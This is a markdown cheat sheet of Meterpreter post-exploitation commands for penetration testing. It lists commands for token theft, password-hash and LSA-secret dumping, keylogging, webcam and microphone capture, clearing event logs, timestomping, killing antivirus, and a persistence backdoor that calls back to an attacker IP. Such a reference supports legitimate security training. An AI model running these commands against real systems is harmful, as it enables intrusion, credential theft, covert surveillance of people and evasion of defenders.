# Index
- [[Metasploit]]
	- [[Metasploit Multi Handler]]
	- [[Meterpreter]]
	- [[Msfvenom]]
	- [[Searchsploit]]

# Meterpreter

Meterpreter is an advanced, dynamically extensible payload that is used within the Metasploit framework for post-exploitation. It provides a command shell with features that allow you to interact with the target machine, including file system manipulation, process interaction, network pivoting, and more. This ultimate edition cheat sheet covers an exhaustive list of Meterpreter commands, detailed explanations, and advanced usage scenarios for post-exploitation and penetration testing.

#### Basic Syntax

```
meterpreter > <command> [options] <arguments>
```

## Core Options

#### Session Management
- `bg | background`: Backgrounds the current session
- `bgkill`: Kills a background Meterpreter scripts
- `bglist`: Lists running background scripts
- `bgrun`: Executes a Meterpreter script as a background thread
<br>
- `channel`: Display information or control active channels
- `read`: Reads data from a channel
- `write`: Writes data to a channel
- `close`: Closes a channel
<br>
- `sessions`: Quickly switch to another session
- `sessions -l`: List all active sessions
- `sessions -i <session_id>`: Interact with a specific session
- `guid`: Get the session GUID
- `uuid`: Get the UUID for the current session
- `pry`: Open the pry debugger on the current session 
- `get_timeouts`: Get current session timeout values
- `set_timeouts`: Set the current session timeout values
- `sleep`: Force Meterpreter to go quiet, then re-establish session
- `irb`: Open an interactive Ruby shell on the current session
- `machine_id`: Get MSF ID of the machine attached to the session
- `secure`: (Re)Negotiate TLV packet encryption on the session
- `sessions -k <ID>`: Terminate a specific session
- `exit`: Exit the Meterpreter session
- `quit`: Terminate the Meterpeter session
<br>
- `info`: Displays information about a post module
- `run`: Executes a Meterpreter script of post module
<br>
- `resource`: Run the commands stored in a file
- `transport`: Change the current transport mechanism
- `pivot`: Manage pivot listeners

#### System Commands
- `sysinfo`: Get information about the target system
- `getenv`: Get oneor more environment variable values
- `getpid`: Get the current process identifier
- `getsid`: Get the SID of the user that the server is running as
- `getuid`: Get the user that the servier is running as
- `localtime`: Display the target system's local date and time

#### Network Commands
- `ipconfig | ipconfig`: Display network interfaces
- `netstat`: Display the network connections
<br>
- `arp`: Display the ARP table
- `resolve`: Resolve a set of hostnames on the target
<br>
- `route`: Display or modify the routing table
- `route add <subnet> <netmask> <gateway>`: Add a route 
- `route delete <subnet> <netmask>`: Delete a route
<br>
- `portfwd list`: List port forwarding rules
- `portfwd add -l <local_port> -p <remote_port> -r <remote_host>`: Add a port forwarding rule
- `portfwd delete -l <local_port>`: Delete a port forwarding rule
<br>
- `getproxy`: Display the current proxy configurations

#### Process Management
- `ps`: List running processes
- `pgrep`: Filter processes by name
- `migrate <pid>`: Migrate to another process
- `kill <pid>`: Kill a process
- `pkill`: Terminate a process by name
- `suspend`: Suspends or resume a list of processes
<br>
- `steal_token`: Attempts to steal an impersonation token from a process
- `drop_token`: Relinquishes any active impersonation token
<br>
- `reg`: Modify and interact with the remote registry
- `clearev`: Clear the event log
 <br>
- `reboot`: Reboot the target system
- `shutdown`: Shut down the target system
<br>
- `shell`: Drop into a system shell
- `execute -f <cmd>`: Execute a command
- `rev2self`: Call RevertToSelf() on the remote machine

#### File System Commands
- `search -f <filename>`: Search for a file
- `cat`: Read the contents of a file
- `edit`: Edit a file
- `cp`: Copy source to destination
- `mv`: Move source to destination
- `rm <file>`: Delete a file
- `upload <src> <dst>`: Upload a file
- `download <src> <dst>`: Download a file
- `checksum`: Retrieve the checksum of a file
<br>
- `timestomp -c <file>`: Clear file timestamps
- `timestamp`: Manipulate file MACE attributes
<br>
- `getwd`: Print working directory
- `pwd`: Print working directory
- `cd <dir>`: Change directory
- `ls | dir`: List files in the current directory
- `mkdir <dir>`: Create a directory
- `rmdir <dir>`: Remove a directory
- `show_mount`: List all mount points/logical drives 
<br>
- `getlwd`: Print local working directory
- `lpwd`: Print local working directory
- `lcd`: Change local working directory
- `lls`: List local files

#### Persistence
- `run persistence -U -i 5 -p <port> -r <attack_ip>`: Create a persistent backdoor

#### Privilege Escalation
- `getsystem`: Attempt to elevate privileges to SYSTEM
- `getprivs`: List available privileges
- `run post/windows/escalate/getsystem`: Use getsystem script

#### Password Extracting
- `hashdump`: Dump password hashes
- `lsa_dump_sam`: Dump the content of the SAM database
- `lsa_dump_secrets`

#### User Interface and Media Commands
- `enumdesktops`: List all accessible desktops and window stations
- `getdesktop`: Get the current Meterpreter desktop
- `setdesktop`: Change the Meterpreter's current desktop
- <br>
- `idle time`: Return the number of seconds the remote user has been idle
- <br>
- `uictl`: Control some of the user interface components
- <br>
- `keyboard_send`: Send ketstrokes
- `keyevent`: Send key events
- `keyscan_start`: Start the keylogger
- `keyscan_dump`: Dump the keystrokes
- `keyscan_stop`: Stop the keylogger
- <br>
- `mouse`: Send mouse events
- <br>
- `screenshare`: Watch the remote user's desktop in real-time
- `screenshot`: Take a screenshot of the desktop
- <br>
- `record_mic`: Record audio from the default microphone for 'x' seconds
- `webcam_chat`: Start a video chat
- `webcam_list`: List webcams
- `webcam_snap`: Take a snapshot from the webcam
- `webcam_stream`: Stream video from the webcam
- <br>
- `play`: Play a waveform audio file (.wav) on the target system

#### Extensions
- `use <extension>`: Load a Meterpreter extension
- `load <extension>`: Load an extension (e.g., `load kiwi` for Mimikatz)

#### Miscellaneous
- `disable_unicode_encoding`: Disables encoding of Unicode strings
- `enable_unicode_encoding`: Enables encoding of Unicode strings

# Advanced Meterpreter Usage

## Script and Module Execution
Meterpreter supports running scripts and modules to automate tasks and extend functionality.

#### Running Post-Exploitation Modules
- `run post/windows/gather/hashdump`: Dump password hashes
- `run post/multi/gather/enum_network`: Enumerate network information
- `run post/windows/manage/killav`: Kill antivirus processes

#### Custom Scripts
- Meterpreter allows running custom scripts to perform specific tasks.
	```bash
	run <script_name>
	```

#### File Structure
Meterpreter scripts and modules are stored under:
- `/usr/share/metasploit-framework/scripts/`
- `/usr/share/metasploit-framework/modules/`

# Resources

|**Website**|**URL**|
|-|-|
|Metasploit Framework|[https://www.metasploit.com](https://www.metasploit.com)|
|Meterpreter Commands|https://docs.rapid7.com/metasploit/meterpreter-basics/|
|Offensive Security|https://www.offensive-security.com/metasploit-unleashed/Meterpreter-Basics/|
|HackTricks Meterpreter|https://book.hacktricks.xyz/pentesting/pentesting-web/meterpreter-basics|
|Rapid7 Blog|https://blog.rapid7.com/tag/meterpreter/|
|Metasploit Unleashed|https://www.offensive-security.com/metasploit-unleashed/|
|Exploit Database|[https://www.exploit-db.com/](https://www.exploit-db.com/)|
|Null Byte|https://null-byte.wonderhowto.com/how-to/|
|HackerSploit|[https://www.hackersploit.org/](https://www.hackersploit.org/)|
|Cyber Mentor|[https://www.youtube.com/c/TheCyberMentor](https://www.youtube.com/c/TheCyberMentor)|